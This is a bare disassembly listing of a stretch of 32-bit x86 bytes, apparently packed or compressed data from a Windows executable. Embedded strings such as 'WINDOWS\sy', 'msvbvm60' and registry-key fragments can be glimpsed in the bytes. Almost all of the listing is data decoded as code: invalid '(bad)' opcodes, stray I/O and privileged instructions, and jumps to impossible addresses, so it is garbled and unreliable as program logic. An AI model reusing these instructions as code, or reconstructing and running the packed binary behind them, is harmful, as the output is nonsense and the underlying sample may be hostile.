  413594:	0f 78 03             	vmread %eax,(%ebx)
  413597:	18 c7                	sbb    %al,%bh
  413599:	db 46 84             	fildl  -0x7c(%esi)
  41359c:	ac                   	lods   %ds:(%esi),%al
  41359d:	7d 80                	jge    0x41351f
  41359f:	ba 19 67 8b 64       	mov    $0x648b6719,%edx
  4135a4:	23 42 56             	and    0x56(%edx),%eax
  4135a7:	68 5b 17 c3 41       	push   $0x41c3175b
  4135ac:	7f fb                	jg     0x4135a9
  4135ae:	9e                   	sahf
  4135af:	33 4b 6b             	xor    0x6b(%ebx),%ecx
  4135b2:	21 6e 65             	and    %ebp,0x65(%esi)
  4135b5:	6c                   	insb   (%dx),%es:(%edi)
  4135b6:	33 32                	xor    (%edx),%esi
  4135b8:	00 dd                	add    %bl,%ch
  4135ba:	5e                   	pop    %esi
  4135bb:	28 9c ff 43 b9 9a 65 	sub    %bl,0x659ab943(%edi,%edi,8)
  4135c2:	4d                   	dec    %ebp
  4135c3:	75 03                	jne    0x4135c8
  4135c5:	78 41                	js     0x413608
  4135c7:	0b 36                	or     (%esi),%esi
  4135c9:	e1 62                	loope  0x41362d
  4135cb:	8b 67 4f             	mov    0x4f(%edi),%esp
  4135ce:	ad                   	lods   %ds:(%esi),%eax
  4135cf:	79 6b                	jns    0x41363c
  4135d1:	f5                   	cmc
  4135d2:	77 07                	ja     0x4135db
  4135d4:	6c                   	insb   (%dx),%es:(%edi)
  4135d5:	1c 6f                	sbb    $0x6f,%al
  4135d7:	a1 24 0c 0b c0       	mov    0xc00b0c24,%eax
  4135dc:	74 02                	je     0x4135e0
  4135de:	ff e0                	jmp    *%eax
  4135e0:	68 d6 9a 8a 7e       	push   $0x7e8a9ad6
  4135e5:	9f                   	lahf
  4135e6:	b8 90 da d0 0d       	mov    $0xdd0da90,%eax
  4135eb:	47                   	inc    %edi
  4135ec:	61                   	popa
  4135ed:	93                   	xchg   %eax,%ebx
  4135ee:	ad                   	lods   %ds:(%esi),%eax
  4135ef:	0d 52 54 48 73       	or     $0x73485452,%eax
  4135f4:	47                   	inc    %edi
  4135f5:	e4 40                	in     $0x40,%al
  4135f7:	ba d7 30 bb 47       	mov    $0x47bb30d7,%edx
  4135fc:	28 30                	sub    %dh,(%eax)
  4135fe:	b7 df                	mov    $0xdf,%bh
  413600:	85 bc 40 7d 0c 8f 6c 	test   %edi,0x6c8f0c7d(%eax,%eax,2)
  413607:	6f                   	outsl  %ds:(%esi),(%dx)
  413608:	45                   	inc    %ebp
  413609:	48                   	dec    %eax
  41360a:	61                   	popa
  41360b:	0c 32                	or     $0x32,%al
  41360d:	d6                   	salc
  41360e:	1a 5a 4e             	sbb    0x4e(%edx),%bl
  413611:	43                   	inc    %ebx
  413612:	78 34                	js     0x413648
  413614:	53                   	push   %ebx
  413615:	72 c9                	jb     0x4135e0
  413617:	81 3c 84 48 64 43 c2 	cmpl   $0xc2436448,(%esp,%eax,4)
  41361e:	64 27                	fs daa
  413620:	23 93 22 0f 7c 41    	and    0x417c0f22(%ebx),%edx
  413626:	e2 29                	loop   0x413651
  413628:	97                   	xchg   %eax,%edi
  413629:	c4                   	(bad)
  41362a:	fb                   	sti
  41362b:	00 79 a3             	add    %bh,-0x5d(%ecx)
  41362e:	ed                   	in     (%dx),%eax
  41362f:	21 24 37             	and    %esp,(%edi,%esi,1)
  413632:	7f 53                	jg     0x413687
  413634:	87 65 65             	xchg   %esp,0x65(%ebp)
  413637:	39 90 93 df 8b 08    	cmp    %edx,0x88bdf93(%eax)
  41363d:	7e 40                	jle    0x41367f
  41363f:	48                   	dec    %eax
  413640:	4b                   	dec    %ebx
  413641:	72 24                	jb     0x413667
  413643:	2f                   	das
  413644:	10 7e 08             	adc    %bh,0x8(%esi)
  413647:	09 90 7c ae e3 2e    	or     %edx,0x2ee3ae7c(%eax)
  41364d:	89 78 03             	mov    %edi,0x3(%eax)
  413650:	6b 59 e8 38          	imul   $0x38,-0x18(%ecx),%ebx
  413654:	8b be 8b 5c d2 41    	mov    0x41d25c8b(%esi),%edi
  41365a:	c9                   	leave
  41365b:	63 56 63             	arpl   %edx,0x63(%esi)
  41365e:	4f                   	dec    %edi
  41365f:	c5 fb 05             	(bad)
  413662:	69 05 64 3d 34 32 46 	imul   $0x5693746,0x32343d64,%eax
  413669:	37 69 05 
  41366c:	64 f7 0c 79 86 54 b2 	testl  $0xeeb25486,%fs:(%ecx,%edi,2)
  413673:	ee 
  413674:	1f                   	pop    %ds
  413675:	13 6d 63             	adc    0x63(%ebp),%ebp
  413678:	1f                   	pop    %ds
  413679:	e2 dd                	loop   0x413658
  41367b:	fc                   	cld
  41367c:	ff 63 b8             	jmp    *-0x48(%ebx)
  41367f:	66 c4 a4 9f 49 1b 10 	les    -0x44efe4b7(%edi,%ebx,4),%sp
  413686:	bb 
  413687:	78 38                	js     0x4136c1
  413689:	3c bb                	cmp    $0xbb,%al
  41368b:	eb 07                	jmp    0x413694
  41368d:	bd b1 f1 ef 63       	mov    $0x63eff1b1,%ebp
  413692:	41                   	inc    %ecx
  413693:	6e                   	outsb  %ds:(%esi),(%dx)
  413694:	44                   	inc    %esp
  413695:	4c                   	dec    %esp
  413696:	4c                   	dec    %esp
  413697:	9d                   	popf
  413698:	5b                   	pop    %ebx
  413699:	ff 87 84 13 cf ae    	incl   -0x5130ec7c(%edi)
  41369f:	57                   	push   %edi
  4136a0:	06                   	push   %es
  4136a1:	61                   	popa
  4136a2:	05 be 49 83 1a       	add    $0x1a8349be,%eax
  4136a7:	27                   	daa
  4136a8:	e1 ff                	loope  0x4136a9
  4136aa:	ff 43 f6             	incl   -0xa(%ebx)
  4136ad:	80 85 8e 2a 1f b7 5a 	addb   $0x5a,-0x48e0d572(%ebp)
  4136b4:	7c 34                	jl     0x4136ea
  4136b6:	81 8a 25 48 b6 5b a5 	orl    $0x78ab96a5,0x5bb64825(%edx)
  4136bd:	96 ab 78 
  4136c0:	87 38                	xchg   %edi,(%eax)
  4136c2:	21 df                	and    %ebx,%edi
  4136c4:	f4                   	hlt
  4136c5:	1a 19                	sbb    (%ecx),%bl
  4136c7:	f7 47 0f 21 4a 54 ea 	testl  $0xea544a21,0xf(%edi)
  4136ce:	2d d6 ff e6 ff       	sub    $0xffe6ffd6,%eax
  4136d3:	c8 d1 11 a3          	enter  $0x11d1,$0xa3
  4136d7:	e4 00                	in     $0x0,%al
  4136d9:	a0 c9 0a ea 82       	mov    0x82ea0ac9,%al
  4136de:	57                   	push   %edi
  4136df:	49                   	dec    %ecx
  4136e0:	4e                   	dec    %esi
  4136e1:	44                   	inc    %esp
  4136e2:	4f                   	dec    %edi
  4136e3:	57                   	push   %edi
  4136e4:	53                   	push   %ebx
  4136e5:	5c                   	pop    %esp
  4136e6:	73 79                	jae    0x413761
  4136e8:	29 bc f0 7f e3 65 6d 	sub    %edi,0x6d65e37f(%eax,%esi,8)
  4136ef:	82 5c 6d 73 76       	sbbb   $0x76,0x73(%ebp,%ebp,2)
  4136f4:	62 76 6d             	bound  %esi,0x6d(%esi)
  4136f7:	36 30 2e             	xor    %ch,%ss:(%esi)
  4136fa:	ec                   	in     (%dx),%al
  4136fb:	6c                   	insb   (%dx),%es:(%edi)
  4136fc:	5c                   	pop    %esp
  4136fd:	33 5e 18             	xor    0x18(%esi),%ebx
  413700:	1f                   	pop    %ds
  413701:	7f fb                	jg     0x4136fe
  413703:	52                   	push   %edx
  413704:	55                   	push   %ebp
  413705:	4e                   	dec    %esi
  413706:	ef                   	out    %eax,(%dx)
  413707:	7f ff                	jg     0x413708
  413709:	50                   	push   %eax
  41370a:	7f 16                	jg     0x413722
  41370c:	42                   	inc    %edx
  41370d:	b2 5c                	mov    $0x5c,%dl
  41370f:	74 7f                	je     0x413790
  413711:	50                   	push   %eax
  413712:	5f                   	pop    %edi
  413713:	40                   	inc    %eax
  413714:	06                   	push   %es
  413715:	a1 6b 48 64 05       	mov    0x564486b,%eax
  41371a:	74 1f                	je     0x41373b
  41371c:	0c 8c                	or     $0x8c,%al
  41371e:	1d c2 c1 07 04       	sbb    $0x407c1c2,%eax
  413723:	04 87                	add    $0x87,%al
  413725:	08 0b                	or     %cl,(%ebx)
  413727:	10 de                	adc    %bl,%dh
  413729:	e8 c3 8c 10 b7       	call   0xb751c3f1
  41372e:	61                   	popa
  41372f:	34 61                	xor    $0x61,%al
  413731:	70 69                	jo     0x41379c
  413733:	fa                   	cli
  413734:	31 be d7 8c 83 17    	xor    %edi,0x17838cd7(%esi)
  41373a:	0f cb                	bswap  %ebx
  41373c:	67 53                	addr16 push %ebx
  41373e:	65 74 56             	gs je  0x413797
  413741:	c2 f5 9d             	ret    $0x9df5
  413744:	5e                   	pop    %esi
  413745:	a3 75 65 45 15       	mov    %eax,0x15456575
  41374a:	49                   	dec    %ecx
  41374b:	46                   	inc    %esi
  41374c:	fc                   	cld
  41374d:	ce                   	into
  41374e:	d8 6d 11             	fsubrs 0x11(%ebp)
  413751:	f5                   	cmc
  413752:	10 e8                	adc    %ch,%al
  413754:	8b fc                	mov    %esp,%edi
  413756:	7f 0b                	jg     0x413763
  413758:	54                   	push   %esp
  413759:	85 bc e4 40 5c 1c 80 	test   %edi,-0x7fe3a3c0(%esp,%eiz,8)
  413760:	65 05 da d9 11 57    	gs add $0x5711d9da,%eax
  413766:	51                   	push   %ecx
  413767:	52                   	push   %edx
  413768:	24 59                	and    $0x59,%al
  41376a:	0e                   	push   %cs
  41376b:	e4 e4                	in     $0xe4,%al
  41376d:	d8 00                	fadds  (%eax)
  41376f:	4b                   	dec    %ebx
  413770:	54                   	push   %esp
  413771:	80 60 68 3f          	andb   $0x3f,0x68(%eax)
  413775:	19 92 4b 68 0e 4f    	sbb    %edx,0x4f0e684b(%edx)
  41377b:	70 65                	jo     0x4137e2
  41377d:	6e                   	outsb  %ds:(%esi),(%dx)
  41377e:	c8 20 df ec          	enter  $0xdf20,$0xec
  413782:	4b                   	dec    %ebx
  413783:	65 79 48             	gs jns 0x4137ce
  413786:	47                   	inc    %edi
  413787:	a0 6c 32 24 97       	mov    0x9724326c,%al
  41378c:	1c 74                	sbb    $0x74,%al
  41378e:	b0 10                	mov    $0x10,%al
  413790:	b3 58                	mov    $0x58,%bl
  413792:	c1 74 44 ba 90       	shll   $0x90,-0x46(%esp,%eax,2)
  413797:	94                   	xchg   %eax,%esp
  413798:	db 4b 0e             	fisttpl 0xe(%ebx)
  41379b:	64 b0 e8             	fs mov $0xe8,%al
  41379e:	8f                   	(bad)
  41379f:	78 80                	js     0x413721
  4137a1:	98                   	cwtl
  4137a2:	9b                   	fwait
  4137a3:	2d 90 f8 47 91       	sub    $0x9147f890,%eax
  4137a8:	8f                   	(bad)
  4137a9:	92                   	xchg   %eax,%edx
  4137aa:	03 39                	add    (%ecx),%edi
  4137ac:	79 30                	jns    0x4137de
  4137ae:	81 84 8c d8 ac 04 f2 	addl   $0xd9928140,-0xdfb5328(%esp,%ecx,4)
  4137b5:	40 81 92 d9 
  4137b9:	0e                   	push   %cs
  4137ba:	64 90                	fs nop
  4137bc:	2f                   	das
  4137bd:	47                   	inc    %edi
  4137be:	78 90                	js     0x413750
  4137c0:	98                   	cwtl
  4137c1:	35 19 92 4b 88       	xor    $0x884b9219,%eax
  4137c6:	0c 4c                	or     $0x4c,%al
  4137c8:	0f 00 ef             	verw   %edi
  4137cb:	4a                   	dec    %edx
  4137cc:	46                   	inc    %esi
  4137cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4137ce:	48                   	dec    %eax
  4137cf:	3b 61 1a             	cmp    0x1a(%ecx),%esp
  4137d2:	0c 9e                	or     $0x9e,%al
  4137d4:	43                   	inc    %ebx
  4137d5:	46                   	inc    %esi
  4137d6:	15 45 89 0e 64       	adc    $0x640e8945,%eax
  4137db:	90                   	nop
  4137dc:	ef                   	out    %eax,(%dx)
  4137dd:	29 5f c0             	sub    %ebx,-0x40(%edi)
  4137e0:	9c                   	pushf
  4137e1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4137e2:	b3 2f                	mov    $0x2f,%bl
  4137e4:	90                   	nop
  4137e5:	4b                   	dec    %ebx
  4137e6:	e8 53 61 76 ed       	call   0xedb7993e
  4137eb:	e4 40                	in     $0x40,%al
  4137ed:	4e                   	dec    %esi
  4137ee:	7e 43                	jle    0x413833
  4137f0:	20 82 a8 b0 b7 c9    	and    %al,-0x36484f58(%edx)
  4137f6:	85 bc 2c 82 0f 46 73 	test   %edi,0x73460f82(%esp,%ebp,1)
  4137fd:	74 72                	je     0x413871
  4137ff:	72 8c                	jb     0x41378d
  413801:	c9                   	leave
  413802:	6f                   	outsl  %ds:(%esi),(%dx)
  413803:	72 0b                	jb     0x413810
  413805:	64 82 b4 09 e4 25 07 	xorb   $0x74,%fs:-0x43f8da1c(%ecx,%ecx,1)
  41380c:	bc 74 
  41380e:	82 c8 60             	or     $0x60,%al
  413811:	13 f2                	adc    %edx,%esi
  413813:	45                   	inc    %ebp
  413814:	6e                   	outsb  %ds:(%esi),(%dx)
  413815:	75 6d                	jne    0x413884
  413817:	ac                   	lods   %ds:(%esi),%al
  413818:	47                   	inc    %edi
  413819:	c0 58 21 97          	rcrb   $0x97,0x21(%eax)
  41381d:	1c c8                	sbb    $0xc8,%al
  41381f:	bc c8 20 67 c1       	mov    $0xc16720c8,%esp
  413824:	09 47 f4             	or     %eax,-0xc(%edi)
  413827:	cc                   	int3
  413828:	24 90                	and    $0x90,%al
  41382a:	97                   	xchg   %eax,%edi
  41382b:	1c d4                	sbb    $0xd4,%al
  41382d:	04 83                	add    $0x83,%al
  41382f:	72 f2                	jb     0x413823
  413831:	b0 24                	mov    $0x24,%al
  413833:	c3                   	ret
  413834:	47                   	inc    %edi
  413835:	3c 83                	cmp    $0x83,%al
  413837:	d8 08                	fmuls  (%eax)
  413839:	c9                   	leave
  41383a:	25 07 e0 4c 89       	and    $0x894ce007,%eax
  41383f:	c6                   	(bad)
  413840:	0b 7f b3             	or     -0x4d(%edi),%edi
  413843:	41                   	inc    %ecx
  413844:	64 6a 75             	fs push $0x75
  413847:	1e                   	push   %ds
  413848:	54                   	push   %esp
  413849:	6f                   	outsl  %ds:(%esi),(%dx)
  41384a:	6b e7 4b             	imul   $0x4b,%edi,%esp
  41384d:	ac                   	lods   %ds:(%esi),%al
  41384e:	28 34 71             	sub    %dh,(%ecx,%esi,2)
  413851:	69 76 46 67 2e 03 f9 	imul   $0xf9032e67,0x46(%esi),%esi
  413858:	1e                   	push   %ds
  413859:	94                   	xchg   %eax,%esp
  41385a:	da 18                	ficompl (%eax)
  41385c:	48                   	dec    %eax
  41385d:	c5 5b 84             	lds    -0x7c(%ebx),%ebx
  413860:	b9 e4 40 06 e4       	mov    $0xe40640e4,%ecx
  413865:	ec                   	in     (%dx),%al
  413866:	a8 c9                	test   $0xc9,%al
  413868:	ad                   	lods   %ds:(%esi),%eax
  413869:	15 2b bb 56 75       	adc    $0x7556bb2b,%eax
  41386e:	70 c8                	jo     0x413838
  413870:	49                   	dec    %ecx
  413871:	27                   	daa
  413872:	2c f3                	sub    $0xf3,%al
  413874:	e0 83                	loopne 0x4137f9
  413876:	db f0                	fcomi  %st(0),%st
  413878:	b4 92                	mov    $0x92,%ah
  41387a:	97                   	xchg   %eax,%edi
  41387b:	1c f8                	sbb    $0xf8,%al
  41387d:	f8                   	clc
  41387e:	83 5e 6c 6b          	sbbl   $0x6b,0x6c(%esi)
  413882:	e2 8c                	loop   0x413810
  413884:	f0 63 a0 73 b0 33 e4 	lock arpl %esp,-0x1bcc4f8d(%eax)
  41388b:	81 9c fc 4b 30 84 fc 	sbbl   $0xcd4bc804,-0x37bcfb5(%esp,%edi,8)
  413892:	04 c8 4b cd 
  413896:	85 9c 44 84 12 47 46 	test   %ebx,0x46471284(%esp,%eax,2)
  41389d:	43                   	inc    %ebx
  41389e:	83 41 b0 ed          	addl   $0xffffffed,-0x50(%ecx)
  4138a2:	75 72                	jne    0x413916
  4138a4:	72 44                	jb     0x4138ea
  4138a6:	74 51                	je     0x4138f9
  4138a8:	7f 7c                	jg     0x413926
  4138aa:	4b                   	dec    %ebx
  4138ab:	06                   	push   %es
  4138ac:	e4 60                	in     $0x60,%al
  4138ae:	4b                   	dec    %ebx
  4138af:	08 c8                	or     %cl,%al
  4138b1:	10 fe                	adc    %bh,%dh
  4138b3:	c0 b1 90 90 ef 23 6f 	shlb   $0x6f,0x23ef9090(%ecx)
  4138ba:	00 66 cd             	add    %ah,-0x33(%esi)
  4138bd:	0f 19 68 77          	nopl   0x77(%eax)
  4138c1:	19 45 5c             	sbb    %eax,0x5c(%ebp)
  4138c4:	00 4d 63             	add    %cl,0x63(%ebp)
  4138c7:	88 6e 36             	mov    %ch,0x36(%esi)
  4138ca:	06                   	push   %es
  4138cb:	25 73 1b 13 57       	and    $0x57131b73,%eax
  4138d0:	5b                   	pop    %ebx
  4138d1:	3e a2 7b 7f 64 0f    	mov    %al,%ds:0xf647f7b
  4138d7:	77 85                	ja     0x41385e
  4138d9:	43                   	inc    %ebx
  4138da:	72 2f                	jb     0x41390b
  4138dc:	5d                   	pop    %ebp
  4138dd:	d7                   	xlat   %ds:(%ebx)
  4138de:	7d c4                	jge    0x4138a4
  4138e0:	b1 56                	mov    $0x56,%cl
  4138e2:	07                   	pop    %es
  4138e3:	72 17                	jb     0x4138fc
  4138e5:	69 1f 6e 27 64 7a    	imul   $0x7a64276e,(%edi),%ebx
  4138eb:	72 1d                	jb     0x41390a
  4138ed:	3b 70 45             	cmp    0x45(%eax),%esi
  4138f0:	97                   	xchg   %eax,%edi
  4138f1:	72 c1                	jb     0x4138b4
  4138f3:	eb 0e                	jmp    0x413903
  4138f5:	63 87 1e 53 11 67    	arpl   %eax,0x6711531e(%edi)
  4138fb:	23 4c b7 3d          	and    0x3d(%edi,%esi,4),%ecx
  4138ff:	d7                   	xlat   %ds:(%ebx)
  413900:	af                   	scas   %es:(%edi),%eax
  413901:	55                   	push   %ebp
  413902:	2f                   	das
  413903:	1b 09                	sbb    (%ecx),%ecx
  413905:	4e                   	dec    %esi
  413906:	79 6d                	jns    0x413975
  413908:	c9                   	leave
  413909:	a0 3b 04 a3 7a       	mov    0x7aa3043b,%al
  41390e:	47                   	inc    %edi
  41390f:	70 c3                	jo     0x4138d4
  413911:	21 31                	and    %esi,(%ecx)
  413913:	83 49 97 dd          	orl    $0xffffffdd,-0x69(%ecx)
  413917:	2b 34 d2             	sub    (%edx,%edx,8),%esi
  41391a:	0d c8 0a 20 c7       	or     $0xc7200ac8,%eax
  41391f:	7e 4f                	jle    0x413970
  413921:	10 d6                	adc    %dl,%dh
  413923:	51                   	push   %ecx
  413924:	d7                   	xlat   %ds:(%ebx)
  413925:	bb 54 a9 41 17       	mov    $0x1741a954,%ebx
  41392a:	45                   	inc    %ebp
  41392b:	c7                   	(bad)
  41392c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  41392d:	78 db                	js     0x41390a
  41392f:	4b                   	dec    %ebx
  413930:	2f                   	das
  413931:	ab                   	stos   %eax,%es:(%edi)
  413932:	62 43 97             	bound  %eax,-0x69(%ebx)
  413935:	ee                   	out    %al,(%dx)
  413936:	2b d2                	sub    %edx,%edx
  413938:	6d                   	insl   (%dx),%es:(%edi)
  413939:	73 74                	jae    0x4139af
  41393b:	bb 74 9b 46 4d       	mov    $0x4d469b74,%ebx
  413940:	0e                   	push   %cs
  413941:	01 c6                	add    %eax,%esi
  413943:	ba 6c 01 50 15       	mov    $0x1550016c,%edx
  413948:	68 ab 31 b7 a5       	push   $0xa5b731ab
  41394d:	20 e9                	and    %ch,%cl
  41394f:	a3 76 5b 64 6d       	mov    %eax,0x6d645b76
  413954:	e7 0b                	out    %eax,$0xb
  413956:	d2 45 61             	rolb   %cl,0x61(%ebp)
  413959:	0d 63 83 32 58       	or     $0x58328363,%eax
  41395e:	37                   	aaa
  41395f:	44                   	inc    %esp
  413960:	08 ef                	or     %ch,%bh
  413962:	50                   	push   %eax
  413963:	07                   	pop    %es
  413964:	6c                   	insb   (%dx),%es:(%edi)
  413965:	45                   	inc    %ebp
  413966:	43                   	inc    %ebx
  413967:	02 e3                	add    %bl,%ah
  413969:	8b 7f 73             	mov    0x73(%edi),%edi
  41396c:	01 ff                	add    %edi,%edi
  41396e:	75 63                	jne    0x4139d3
  413970:	63 cd                	arpl   %ecx,%ebp
  413972:	4e                   	dec    %esi
  413973:	46                   	inc    %esi
  413974:	2b 64 15 4f          	sub    0x4f(%ebp,%edx,1),%esp
  413978:	23 74 10 24          	and    0x24(%eax,%edx,1),%esi
  41397c:	1d 83 45 73 8f       	sbb    $0x8f734583,%eax
  413981:	74 c2                	je     0x413945
  413983:	7b bc                	jnp    0x413941
  413985:	c3                   	ret
  413986:	5c                   	pop    %esp
  413987:	b9 0b 79 79 bf       	mov    $0xbf79790b,%ecx
  41398c:	ce                   	into
  41398d:	37                   	aaa
  41398e:	12 68 6d             	adc    0x6d(%eax),%ch
  413991:	17                   	pop    %ss
  413992:	34 32                	xor    $0x32,%al
  413994:	98                   	cwtl
  413995:	ec                   	in     (%dx),%al
  413996:	f1                   	int1
  413997:	7f 95                	jg     0x41392e
  413999:	1b 2e                	sbb    (%esi),%ebp
  41399b:	27                   	daa
  41399c:	5d                   	pop    %ebp
  41399d:	c7 81 50 63 4f 1b 6a 	movl   $0xf863096a,0x1b4f6350(%ecx)
  4139a4:	09 63 f8 
  4139a7:	82 0d 16 63 43 63 1d 	orb    $0x1d,0x63436316
  4139ae:	54                   	push   %esp
  4139af:	8b 7d c9             	mov    -0x37(%ebp),%edi
  4139b2:	c6                   	(bad)
  4139b3:	af                   	scas   %es:(%edi),%eax
  4139b4:	74 37                	je     0x4139ed
  4139b6:	00 57 55             	add    %dl,0x55(%edi)
  4139b9:	1d 67 c9 f8 de       	sbb    $0xdef8c967,%eax
  4139be:	2b 9f 73 4b 51 70    	sub    0x70514b73(%edi),%ebx
  4139c4:	b8 b3 4a 48 0f       	mov    $0xf484ab3,%eax
  4139c9:	cb                   	lret
  4139ca:	68 19 77 78 6e       	push   $0x6e787719
  4139cf:	7b 65                	jnp    0x413a36
  4139d1:	19 41 17             	sbb    %eax,0x17(%ecx)
  4139d4:	d7                   	xlat   %ds:(%ebx)
  4139d5:	1f                   	pop    %ds
  4139d6:	65 d5 96             	gs aad $0x96
  4139d9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4139da:	b3 ef                	mov    $0xef,%bl
  4139dc:	00 51 4d             	add    %dl,0x4d(%ecx)
  4139df:	70 22                	jo     0x413a03
  4139e1:	74 dd                	je     0x4139c0
  4139e3:	ec                   	in     (%dx),%al
  4139e4:	f5                   	cmc
  4139e5:	5f                   	pop    %edi
  4139e6:	1b 70 ab             	sbb    -0x55(%eax),%esi
  4139e9:	48                   	dec    %eax
  4139ea:	01 f2                	add    %esi,%edx
  4139ec:	e4 02                	in     $0x2,%al
  4139ee:	cf                   	iret
  4139ef:	7f a0                	jg     0x413991
  4139f1:	83 bf 10 80 14 c8 56 	cmpl   $0x56,-0x37eb7ff0(%edi)
  4139f8:	72 92                	jb     0x41398c
  4139fa:	03 1c c8             	add    (%eax,%ecx,8),%ebx
  4139fd:	c4 88 fc 66 b0 2c    	les    0x2cb066fc(%eax),%ecx
  413a03:	eb 4f                	jmp    0x413a54
  413a05:	47                   	inc    %edi
  413a06:	fc                   	cld
  413a07:	88 7a c9             	mov    %bh,-0x37(%edx)
  413a0a:	81 9c 20 28 0c 89 6b 	sbbl   $0x13b2b42b,0x6b890c28(%eax,%eiz,1)
  413a11:	2b b4 b2 13 
  413a15:	44                   	inc    %esp
  413a16:	43                   	inc    %ebx
  413a17:	4d                   	dec    %ebp
  413a18:	be 9c 3c 3b b0       	mov    $0xb03b3c9c,%esi
  413a1d:	61                   	popa
  413a1e:	67 5a                	addr16 pop %edx
  413a20:	47                   	inc    %edi
  413a21:	44                   	inc    %esp
  413a22:	89 2c 00             	mov    %ebp,(%eax,%eax,1)
  413a25:	72 c9                	jb     0x4139f0
  413a27:	81 34 54 64 90 23 f9 	xorl   $0xf9239064,(%esp,%edx,2)
  413a2e:	50                   	push   %eax
  413a2f:	6f                   	outsl  %ds:(%esi),(%dx)
  413a30:	73 74                	jae    0x413aa6
  413a32:	8c 38                	mov    %?,(%eax)
  413a34:	18 92 4b 0e 40 9c    	sbb    %dl,-0x63bff1b5(%edx)
  413a3a:	13 0b                	adc    (%ebx),%ecx
  413a3c:	dc 00                	faddl  (%eax)
  413a3e:	13 57 8b             	adc    -0x75(%edi),%edx
  413a41:	41                   	inc    %ecx
  413a42:	74 74                	je     0x413ab8
  413a44:	f6 62 09             	mulb   0x9(%edx)
  413a47:	4f                   	dec    %edi
  413a48:	60                   	pusha
  413a49:	57                   	push   %edi
  413a4a:	a8 73                	test   $0x73,%al
  413a4c:	41                   	inc    %ecx
  413a4d:	57                   	push   %edi
  413a4e:	d4 89                	aam    $0x89
  413a50:	23 92 97 1c c8 44    	and    0x44c81c97(%edx),%edx
  413a56:	4c                   	dec    %esp
  413a57:	e8 89 da ac ba       	call   0xbaee14e5
  413a5c:	b0 19                	mov    $0x19,%al
  413a5e:	69 74 05 0a 1c c8 c9 	imul   $0xc1c9c81c,0xa(%ebp,%eax,1),%esi
  413a65:	c1 
  413a66:	93                   	xchg   %eax,%ebx
  413a67:	20 8a 50 58 36 b9    	and    %cl,-0x46c9a7b0(%edx)
  413a6d:	90                   	nop
  413a6e:	97                   	xchg   %eax,%edi
  413a6f:	30 8a 0f 46 c8 20    	xor    %cl,0x20c8460f(%edx)
  413a75:	67 7f 54             	addr16 jg 0x413acc
  413a78:	65 78 74             	gs js  0x413aef
  413a7b:	41                   	inc    %ecx
  413a7c:	47                   	inc    %edi
  413a7d:	68 5c 32 24 97       	push   $0x9724325c
  413a82:	1c 64                	sbb    $0x64,%al
  413a84:	78 15                	js     0x413a9b
  413a86:	4d                   	dec    %ebp
  413a87:	c2 0b 47             	ret    $0x470b
  413a8a:	4c                   	dec    %esp
  413a8b:	78 67                	js     0x413af4
  413a8d:	74 68                	je     0x413af7
  413a8f:	2b b0 5e 72 20 83    	sub    -0x7cdf8da2(%eax),%esi
  413a95:	4f                   	dec    %edi
  413a96:	68 70 c8 8a 2d       	push   $0x2d8ac870
  413a9b:	09 ae 2c df 62 4f    	or     %ebp,0x4f62df2c(%esi)
  413aa1:	ac                   	lods   %ds:(%esi),%al
  413aa2:	4e                   	dec    %esi
  413aa3:	6a 48                	push   $0x48
  413aa5:	5f                   	pop    %edi
  413aa6:	5d                   	pop    %ebp
  413aa7:	61                   	popa
  413aa8:	7f 0b                	jg     0x413ab5
  413aaa:	09 86 64 1c 20 ad    	or     %eax,-0x52dfe39c(%esi)
  413ab0:	b3 d9                	mov    $0xd9,%bl
  413ab2:	1b 02                	sbb    (%edx),%eax
  413ab4:	df 3f                	fistpll (%edi)
  413ab6:	37                   	aaa
  413ab7:	13 83 c4 60 5f ab    	adc    -0x54a09f3c(%ebx),%eax
  413abd:	2c 07                	sub    $0x7,%al
  413abf:	2a 8b 04 13 75 20    	sub    0x20751304(%ebx),%cl
  413ac5:	45                   	inc    %ebp
  413ac6:	ff 73 d4             	push   -0x2c(%ebx)
  413ac9:	74 21                	je     0x413aec
  413acb:	60                   	pusha
  413acc:	be 0f 1a 91 57       	mov    $0x57911a0f,%esi
  413ad1:	48                   	dec    %eax
  413ad2:	b3 03                	mov    $0x3,%bl
  413ad4:	8c 47 61             	mov    %es,0x61(%edi)
  413ad7:	19 1f                	sbb    %ebx,(%edi)
  413ad9:	fb                   	sti
  413ada:	d1 83 0b 5b 1f 30    	roll   $1,0x301f5b0b(%ebx)
  413ae0:	5f                   	pop    %edi
  413ae1:	78 d1                	js     0x413ab4
  413ae3:	76 7a                	jbe    0x413b5f
  413ae5:	63 19                	arpl   %ebx,(%ecx)
  413ae7:	a1 42 5b 73 dd       	mov    0xdd735b42,%eax
  413aec:	e7 1e                	out    %eax,$0x1e
  413aee:	b9 44 15 11 6d       	mov    $0x6d111544,%ecx
  413af3:	05 27 2b 1b 23       	add    $0x231b2b27,%eax
  413af8:	9d                   	popf
  413af9:	15 ec 6f 35 cb       	adc    $0xcb356fec,%eax
  413afe:	4d                   	dec    %ebp
  413aff:	47                   	inc    %edi
  413b00:	72 d8                	jb     0x413ada
  413b02:	77 72                	ja     0x413b76
  413b04:	63 25 43 31 c9 dd    	arpl   %esp,0xddc93143
  413b0a:	6d                   	insl   (%dx),%es:(%edi)
  413b0b:	5d                   	pop    %ebp
  413b0c:	00 07                	add    %al,(%edi)
  413b0e:	ad                   	lods   %ds:(%esi),%eax
  413b0f:	b0 00                	mov    $0x0,%al
  413b11:	bb 45 00 ec 1b       	mov    $0x1bec0045,%ebx
  413b16:	5f                   	pop    %edi
  413b17:	0c 79                	or     $0x79,%al
  413b19:	24 00                	and    $0x0,%al
  413b1b:	ff 00                	incl   (%eax)
  413b1d:	66 0e                	pushw  %cs
  413b1f:	2c 20                	sub    $0x20,%al
  413b21:	bb 47 20 07 84       	mov    $0x84072047,%ebx
  413b26:	81 0d 1b 03 00 d1 7c 	orl    $0x438acb7c,0xd100031b
  413b2d:	cb 8a 43 
  413b30:	24 2b                	and    $0x2b,%al
  413b32:	3f                   	aas
  413b33:	01 f2                	add    %esi,%edx
  413b35:	0c 25                	or     $0x25,%al
  413b37:	83 24 48 00          	andl   $0x0,(%eax,%ecx,2)
  413b3b:	58                   	pop    %eax
  413b3c:	c8 2e 79 2c          	enter  $0x792e,$0x2c
  413b40:	78 38                	js     0x413b7a
  413b42:	27                   	daa
  413b43:	17                   	pop    %ss
  413b44:	c1 e8 5c             	shr    $0x5c,%eax
  413b47:	70 7c                	jo     0x413bc5
